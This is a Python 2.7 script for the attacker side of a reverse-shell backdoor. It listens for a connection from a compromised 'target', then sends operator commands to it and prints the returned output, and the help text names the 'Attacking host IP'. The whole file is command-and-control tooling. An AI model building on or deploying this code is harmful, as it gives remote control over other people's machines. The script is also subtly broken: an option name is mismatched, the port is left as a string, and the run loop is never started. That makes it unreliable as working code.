#! /usr/bin/python
"""A simple listener script.
   Uses Python 2.7.16"""

import optparse
import socket
import json


def get_arguments():
    """Get user supplied arguments from terminal."""
    parser = optparse.OptionParser()
    # arguments
    parser.add_option('-l', '--local', dest='local_io', help='Attacking host IP.')
    parser.add_option('-p', '--port', dest='port', help='Port to connect to.')

    (options, arguments) = parser.parse_args()

    return options


options = get_arguments()


class Listener:
    def __init__(self, local_ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((local_ip, port))
        listener.listen(0)
        print('[+] Waiting for incoming connections...')
        self.connection, address = listener.accept()
        print('[+] Connection from ' + str(address) + '.')


    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)


    def reliable_receive(self):
        json_data = self.connection.recv(1024)
        return json.loads(json_data)


    def execute_remotely(self, command):
        self.reliable_send(command)  # sends command to target
        return self.reliable_receive()


    def run(self):
        while True:
            command = raw_input('>> ')
            result = self.execute_remotely(command)
            print(result)


my_listener = Listener(options.local_ip, options.port)
